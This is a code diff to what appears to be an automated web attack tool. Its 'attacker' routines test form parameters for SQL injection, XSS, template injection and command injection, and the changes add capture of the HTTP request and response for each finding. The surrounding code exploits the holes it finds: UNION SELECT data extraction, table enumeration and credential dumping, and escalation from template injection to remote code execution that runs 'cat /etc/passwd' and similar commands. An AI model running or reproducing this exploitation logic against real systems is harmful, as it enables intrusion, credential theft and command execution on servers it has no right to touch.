@@ -358,20 +358,34 @@ def _make_finding(
     payload: str = "",
     evidence: str = "",
     url: str = "",
+    http_evidence: Optional[Dict[str, Any]] = None,
 ) -> Dict[str, Any]:
     sev = severity.upper()
-    return {
-        "id":          str(uuid.uuid4()),
-        "severity":    sev,
-        "description": description[:400],
-        "tool":        tool,
-        "agent":       "attacker",
-        "iteration":   1,
-        "cvss":        _CVSS.get(sev, 1.0),
-        "raw_output":  f"payload={payload!r}\nevidence={evidence[:600]}",
-        "url":         url,
-        "created_at":  time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    base: Dict[str, Any] = {
+        "id":               str(uuid.uuid4()),
+        "severity":         sev,
+        "description":      description[:400],
+        "tool":             tool,
+        "agent":            "attacker",
+        "iteration":        1,
+        "cvss":             _CVSS.get(sev, 1.0),
+        "raw_output":       f"payload={payload!r}\nevidence={evidence[:600]}",
+        "url":              url,
+        "created_at":       time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        # HTTP evidence defaults
+        "request_method":   "",
+        "request_url":      url,
+        "request_headers":  "{}",
+        "request_body":     "",
+        "response_status":  0,
+        "response_headers": "{}",
+        "response_body":    "",
+        "payload":          payload,
+        "timing_ms":        0.0,
     }
+    if http_evidence:
+        base.update(http_evidence)
+    return base
 
 
 def _benign_form_data(
@@ -400,6 +414,31 @@ def _benign_form_data(
     return data
 
 
+def _capture_http_evidence(
+    resp: "httpx.Response",
+    elapsed: float,
+    payload: str = "",
+) -> Dict[str, Any]:
+    try:
+        req_headers  = dict(resp.request.headers)
+        req_body     = resp.request.content.decode("utf-8", errors="replace")[:1500]
+        resp_body    = resp.text[:2000]
+        resp_headers = dict(resp.headers)
+    except Exception:
+        req_headers = {}; req_body = ""; resp_body = ""; resp_headers = {}
+    return {
+        "request_method":   getattr(resp.request, "method", ""),
+        "request_url":      str(getattr(resp.request, "url", "")),
+        "request_headers":  json.dumps(req_headers, default=str),
+        "request_body":     req_body if isinstance(req_body, str) else "",
+        "response_status":  resp.status_code,
+        "response_headers": json.dumps(resp_headers, default=str),
+        "response_body":    resp_body if isinstance(resp_body, str) else "",
+        "payload":          payload,
+        "timing_ms":        round(elapsed * 1000, 1),
+    }
+
+
 async def _send_with_payload(
     session: httpx.AsyncClient,
     url: str,
@@ -407,7 +446,7 @@ async def _send_with_payload(
     fields: List[Dict[str, str]],
     target_field: str,
     payload: str,
-) -> Tuple[Optional[httpx.Response], float]:
+) -> Tuple[Optional[httpx.Response], float, Optional[Dict[str, Any]]]:
     data = _benign_form_data(fields)
     data[target_field] = payload
     t0 = time.time()
@@ -416,9 +455,10 @@ async def _send_with_payload(
             resp = await session.post(url, data=data, timeout=14)
         else:
             resp = await session.get(url, params=data, timeout=12)
-        return resp, time.time() - t0
+        elapsed = time.time() - t0
+        return resp, elapsed, _capture_http_evidence(resp, elapsed, payload)
     except Exception:
-        return None, time.time() - t0
+        return None, time.time() - t0, None
 
 
 async def _get_baseline(
@@ -428,7 +468,7 @@ async def _get_baseline(
     fields: List[Dict[str, str]],
     target_field: str,
 ) -> Optional[str]:
-    resp, _ = await _send_with_payload(session, url, method, fields, target_field, "baseline_phantom_test_123")
+    resp, _, _ = await _send_with_payload(session, url, method, fields, target_field, "baseline_phantom_test_123")
     return resp.text if resp else None
 
 
@@ -456,7 +496,7 @@ async def _exploit_sqli_dump(
     col_count = 1
     for n in range(1, 8):
         p = f"' ORDER BY {n}--"
-        resp, _ = await _send_with_payload(session, url, method, fields, target_field, p)
+        resp, _, _ = await _send_with_payload(session, url, method, fields, target_field, p)
         if resp and any(e in resp.text.lower() for e in ["unknown column", "order by", "1146", "1054"]):
             col_count = n - 1
             break
@@ -478,7 +518,7 @@ async def _exploit_sqli_dump(
         ("data_dir",      "@@datadir"),
     ]:
         try:
-            resp, _ = await _send_with_payload(session, url, method, fields, target_field, _union(expr))
+            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, _union(expr))
             if resp and resp.status_code < 500:
                 # Extract the value from response (appears as raw text)
                 snippet = resp.text[:2000]
@@ -488,6 +528,7 @@ async def _exploit_sqli_dump(
                     f"SQLi Data Extraction at {url} — {label} extracted via UNION SELECT",
                     "attacker/sqli-dump", _union(expr),
                     f"Expression: {expr}\nResponse snippet: {snippet[:500]}", url,
+                    http_evidence=_ev,
                 ))
         except Exception:
             pass
@@ -498,13 +539,14 @@ async def _exploit_sqli_dump(
         f"FROM information_schema.tables WHERE table_schema=database() LIMIT 10--"
     )
     try:
-        resp, _ = await _send_with_payload(session, url, method, fields, target_field, tables_payload)
+        resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, tables_payload)
         if resp and resp.status_code < 500:
             findings.append(_make_finding(
                 "CRITICAL",
                 f"SQLi Table Enumeration at {url} — information_schema.tables queried",
                 "attacker/sqli-tables", tables_payload,
                 resp.text[:800], url,
+                http_evidence=_ev,
             ))
     except Exception:
         pass
@@ -525,7 +567,7 @@ async def _exploit_sqli_dump(
             f"FROM {tbl} LIMIT 5--"
         )
         try:
-            resp, _ = await _send_with_payload(session, url, method, fields, target_field, dump_payload)
+            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, dump_payload)
             if resp and resp.status_code < 500 and len(resp.text) > 100:
                 # Look for user:hash patterns
                 if re.search(r'[a-zA-Z0-9_]+:[a-zA-Z0-9$./+*]{8,}', resp.text):
@@ -535,6 +577,7 @@ async def _exploit_sqli_dump(
                         f"SQLi Credential Dump at {url} — table '{tbl}' exposed user credentials",
                         "attacker/sqli-creds", dump_payload,
                         resp.text[:1000], url,
+                        http_evidence=_ev,
                     ))
                     break
         except Exception:
@@ -621,7 +664,7 @@ async def _exploit_ssti_rce(
 
     for payload, confirm in rce_payloads:
         try:
-            resp, _ = await _send_with_payload(session, url, method, fields, target_field, payload)
+            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
             if resp and confirm in resp.text:
                 snippet = resp.text[:500]
                 await push(f"      💀 SSTI→RCE CONFIRMED! 'id' output in response", "CRITICAL")
@@ -630,6 +673,7 @@ async def _exploit_ssti_rce(
                     f"SSTI Remote Code Execution at {url} — arbitrary OS commands executed as server user",
                     "attacker/ssti-rce", payload,
                     f"RCE output: {snippet}", url,
+                    http_evidence=_ev,
                 ))
                 # Now run more commands to enumerate
                 for cmd in ["id", "whoami", "uname -a", "cat /etc/passwd", "hostname"]:
@@ -637,13 +681,14 @@ async def _exploit_ssti_rce(
                     if p2 == payload:
                         continue
                     try:
-                        r2, _ = await _send_with_payload(session, url, method, fields, target_field, p2)
+                        r2, _t2, _ev2 = await _send_with_payload(session, url, method, fields, target_field, p2)
                         if r2 and r2.text:
                             findings.append(_make_finding(
                                 "CRITICAL",
                                 f"SSTI RCE Command Output at {url} — `{cmd}`",
                                 "attacker/ssti-rce-cmd", p2,
                                 r2.text[:600], url,
+                                http_evidence=_ev2,
                             ))
                     except Exception:
                         pass
@@ -668,7 +713,7 @@ async def _exploit_cmdi_enum(
 
     for cmd_suffix, label in CMDI_ENUM_COMMANDS:
         try:
-            resp, elapsed = await _send_with_payload(session, url, method, fields, target_field, cmd_suffix)
+            resp, elapsed, _ev = await _send_with_payload(session, url, method, fields, target_field, cmd_suffix)
             if resp and len(resp.text) > 20:
                 # Basic sanity: did we get output?
                 has_output = (
@@ -685,6 +730,7 @@ async def _exploit_cmdi_enum(
                         f"CMDi System Enumeration at {url} — `{cmd_suffix.strip()}` output captured",
                         "attacker/cmdi-enum", cmd_suffix,
                         resp.text[:800], url,
+                        http_evidence=_ev,
                     ))
         except Exception:
             continue
@@ -736,7 +782,7 @@ async def _test_sqli(
 
     for payload, technique in SQLI_PAYLOADS:
         try:
-            resp, elapsed = await _send_with_payload(session, url, method, fields, target_field, payload)
+            resp, elapsed, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
             if resp is None:
                 continue
             body_lower = resp.text.lower()
@@ -748,6 +794,7 @@ async def _test_sqli(
                     f"SQL Injection (time-based blind) at {url} — parameter '{target_field}'",
                     "attacker/sqli-time", payload,
                     f"Response delay: {elapsed:.1f}s (≥2.5s threshold)", url,
+                    http_evidence=_ev,
                 ))
                 confirmed_payload = payload
                 break
@@ -760,6 +807,7 @@ async def _test_sqli(
                     f"SQL Injection (error-based) at {url} — parameter '{target_field}'",
                     "attacker/sqli-error", payload,
                     f"DB error keyword: '{snippet}'", url,
+                    http_evidence=_ev,
                 ))
                 confirmed_payload = payload
                 break
@@ -770,6 +818,7 @@ async def _test_sqli(
                     f"Possible SQL Injection (response anomaly) at {url} — parameter '{target_field}'",
                     "attacker/sqli-anomaly", payload,
                     f"Baseline len={len(baseline)}, payload response len={len(resp.text)}", url,
+                    http_evidence=_ev,
                 ))
         except Exception:
             continue
@@ -800,7 +849,7 @@ async def _test_xss(
 
     for payload in XSS_PAYLOADS:
         try:
-            resp, _ = await _send_with_payload(session, url, method, fields, target_field, payload)
+            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
             if resp is None:
                 continue
             if payload in resp.text:
@@ -809,6 +858,7 @@ async def _test_xss(
                     "HIGH",
                     f"Reflected XSS at {url} — parameter '{target_field}'",
                     "attacker/xss", payload, resp.text[:400], url,
+                    http_evidence=_ev,
                 ))
                 confirmed_payload = payload
                 break
@@ -817,6 +867,7 @@ async def _test_xss(
                     "MEDIUM",
                     f"Possible XSS (case-insensitive reflection) at {url} — parameter '{target_field}'",
                     "attacker/xss", payload, resp.text[:300], url,
+                    http_evidence=_ev,
                 ))
                 break
         except Exception:
@@ -844,7 +895,7 @@ async def _test_ssti(
 
     for payload, expected in SSTI_PAYLOADS:
         try:
-            resp, _ = await _send_with_payload(session, url, method, fields, target_field, payload)
+            resp, _t, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
             if resp and expected in resp.text:
                 await push(f"🔥 SSTI → {url}  param={target_field}  ({payload} → {expected})", "CRITICAL")
                 findings.append(_make_finding(
@@ -852,6 +903,7 @@ async def _test_ssti(
                     f"Server-Side Template Injection at {url} — parameter '{target_field}'",
                     "attacker/ssti", payload,
                     f"Template evaluated: {payload} → {expected}", url,
+                    http_evidence=_ev,
                 ))
                 # Immediately try for RCE
                 try:
@@ -920,7 +972,7 @@ async def _test_cmdi(
 
     for payload, confirm in CMDI_PAYLOADS:
         try:
-            resp, elapsed = await _send_with_payload(session, url, method, fields, target_field, payload)
+            resp, elapsed, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
             if resp is None:
                 continue
             if confirm and confirm in resp.text:
@@ -930,6 +982,7 @@ async def _test_cmdi(
                     f"OS Command Injection at {url} — parameter '{target_field}'",
                     "attacker/cmdi", payload,
                     f"Evidence: '{confirm}' in response", url,
+                    http_evidence=_ev,
                 ))
                 confirmed_payload = payload
                 break
@@ -940,6 +993,7 @@ async def _test_cmdi(
                     f"OS Command Injection (time-based blind) at {url} — parameter '{target_field}'",
                     "attacker/cmdi-time", payload,
                     f"Response delay: {elapsed:.1f}s", url,
+                    http_evidence=_ev,
                 ))
                 confirmed_payload = payload
                 break
